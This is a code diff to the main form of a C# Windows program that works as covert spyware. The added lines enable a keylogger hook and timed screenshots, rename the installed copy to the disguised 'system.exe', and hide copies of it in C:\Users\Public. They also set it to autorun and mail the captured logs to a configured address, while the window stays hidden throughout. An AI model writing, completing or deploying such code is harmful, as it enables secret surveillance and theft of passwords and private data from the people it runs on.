@@ -1,50 +1,51 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.IO;
-using System.Linq;
 using System.Net.Mail;
-using System.Text;
 using System.Windows.Forms;
 
 namespace userControlProgram
 {
     public partial class Form1 : Form
     {
-        private const string NeedPath = "C:\\Users\\Public\\userControlProgram.exe";
+        private const string NeedPath = "C:\\Users\\Public\\system.exe";
         private string  _mailTo;
-        public string LogPath;
+        private string LogPath;
         private int _screenShotTimer;
+        private int _mailInterval;
+        private bool _isAutorun;
         public Form1()
         {
             Hide();
-            this.Visible = false;
+            Visible = false;
             Enabled = false;
-            SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _screenShotTimer);
-            //KeyLogger.SetHook(LogPath);
-            //ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
-            Autorun.SetAutorunValue(true, "C:\\Users\\Public\\userControlProgram.exe");
-            MailSender.MainSenderFunc(LogPath, new MailAddress(_mailTo));
+            SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _mailInterval, ref _screenShotTimer, ref _isAutorun);
+            KeyLogger.SetHook(LogPath);
+            ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
+            Autorun.SetAutorunValue(_isAutorun, "C:\\Users\\Public\\system.exe");
+            MailSender.MainSenderFunc(LogPath, new MailAddress(_mailTo), _mailInterval);
+            File.Create(LogPath + "\\report");
             InitializeComponent();
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
             Hide();
-            this.Visible = false;
+            Visible = false;
             if (!File.Exists(NeedPath))
             {
                 try
                 {
-                    File.Copy("userControlProgram.exe", "C:\\Users\\Public\\userControlProgram.exe");
-                    File.SetAttributes("C:\\Users\\Public\\userControlProgram.exe", FileAttributes.Hidden);
-                    File.Copy("userControlProgram.exe", "C:\\Users\\Public\\IonicZip.dll");
+                    File.Copy("system.exe", "C:\\Users\\Public\\system.exe");
+                    File.SetAttributes("C:\\Users\\Public\\system.exe", FileAttributes.Hidden);
+                    File.Copy("system.exe", "C:\\Users\\Public\\IonicZip.dll");
                     File.SetAttributes("C:\\Users\\Public\\IonicZip.dll", FileAttributes.Hidden);
                 }
-                catch
+                catch (Exception ex)
                 {
+                    var log = new StreamWriter(LogPath + "\\report", true);
+                    log.WriteLine("Error in copying exe and dll files. Message: '" + ex.Message + "'\n");
+                    log.Flush();
+                    log.Close();
                     
                 }
             }
